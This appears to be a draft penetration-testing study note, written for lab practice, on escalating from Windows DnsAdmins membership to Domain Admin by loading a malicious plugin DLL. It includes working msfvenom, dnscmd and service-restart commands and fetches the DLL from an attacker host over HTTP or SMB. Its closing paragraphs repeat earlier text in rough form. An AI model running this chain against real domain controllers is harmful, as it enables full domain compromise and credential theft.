---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: draft
---
## `DnsAdmins`

![[🛠️ Windows groups#`DnsAdmins`]]

## Privilege escalation via `DnsAdmins`

- Members of the `DnsAdmins` group do **not** have direct administrative privileges on the OS by default, but they can modify **DNS server configuration over RPC**.
- Since the DNS service runs as `NT AUTHORITY\SYSTEM` on the DC, membership in `DnsAdmins` introduces a potential privilege escalation vector on a Domain Controller. 
- The key feature is the **ability to configure a server-level plugin DLL**. The DNS server supports loading a custom DLL via the [`ServerLevelPluginDll`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) setting. It can be specified using the built-in [`dnscmd`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility. 
- This value is stored in the registry at:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
```

- The path is **neither validated nor restricted** (e.g., can point to a UNC path).
- The DLL is loaded when the DNS service starts.

- When DNS is run on a Domain Controller (which is very common), the following attack is possible:
	- DNS management is performed over RPC
	- [`ServerLevelPluginDll`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL path. This can be done with the `dnscmd` tool from the command line
	- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
	- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
	- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

>[!note] See [`From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration — adsecurity.org`](https://adsecurity.org/?p=4064).

- Confirm membership in the `DnsAdmins` group:

```powershell
Get-ADGroupMember -Identity DnsAdmins
```
## From `DnsAdmins` to `SYSTEM`

- To specify the path of the plugin DLL, you can use the built-in [`dnscmd`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility:

```powershell
dnscmd /config /serverlevelplugindll <path_to_dll>.dll
```

---

1. Generate a malicious DLL that executes your payload (e.g., adding a user to the `Domain Admins` group on the DC) using `msfvenom`:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

2. Transfer the DLL to the target machine:

```bash
python3 -m http.server 8000
```

```powershell
Invoke-WebRequest "http://<attacker_ip_address>:8000/adduser.dll" -OutFile "adduser.dll"
```

3. Load DLL to the DNS server on the DC (this is what you can do as a member of the `DnsAdmins` group, even as an unprivileged user):

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

- The DLL will be loaded the next time the DNS service is started.
- Membership in the `DnsAdmins` group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
- So, after the server is restarted, you should be able to run the loaded DLL, for example, to add a user (in this case) or get a reverse shell.

>[!tip]+
>- Alternatively, you can serve the DLL in an SMB share from your machine ([`impacket-smbserver.py`](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)):
>```bash
>sudo impacket-smbserver share $(pwd) -smb2support
>```
>- And specify the UNC path directly in `dnscmd`:
>```powershell
>dnscmd /config /serverlevelplugindll \\attacker\share\adduser.dll
>```

>[!note] Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.

>[!note]+ To check if you have permissions to restart the DNS server yourself for the changes to take effect:
> 
> - Find your user SID:
> 
> ```bash
> wmic useraccount where name="netadm" get sid
> ```
> 
> - Use the `sc` command to check permissions on the service: 
> 
> ```powershell
> sc.exe sdshow DNS
> ```
> 
>>[!example]+ 
>> ```powershell
>> sc.exe sdshow DNS
>> ```
>> ```powershell
>> D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
>> ```
> 
> - To be able to restart the DNS server, you need to have  `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.
> - Once you confirm the permissions, stop the service and then start it anew:
>```powershell
>sc stop dns
>```
>```powershell
>sc start dns
>```


If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.

```powershell
C:\htb> net group "Domain Admins" /dom
```
 
>[!note] See [`How to View and Modify Service Permissions in Windows — Winhelponline`](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/).

---

- The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain.

- It is possible to use the built-in [`dnscmd`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):
---
- Windows DNS server runs as `SYSTEM`. By default, a DNS server in AD will run on a DC (Domain Controller) -> DCs are also DNS servers. In this case, compromise of the DNS server effectively means **Domain Controller compromise**.
- DNS servers need to be reachable and usable by every domain user. This, in turn, exposes quite some attack surface on domain controllers.
---
- Members of the `DnsAdmins` group can configure the DNS server to load a plugin DLL.
- To specify the path to the plugin DLL, you can use the built-in [`dnscmd`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility:
	- DNS management is performed over RPC.
	- [`ServerLevelPluginDll`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL   path. This can be done with the `dnscmd` tool from the command line
	- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
	- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
	- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
	
	Let's step through the attack.

## Resources and further reading

- [`DndAdmins — OSCP-CTPS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/dnsadmins)
- [`Feature, not bug: DNSAdmin to DC compromise in one line — Shay Ber, Medium`](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
- [`From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration — adsecurity.org`](https://adsecurity.org/?p=4064)
- [`How to View and Modify Service Permissions in Windows — Winhelponline`](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
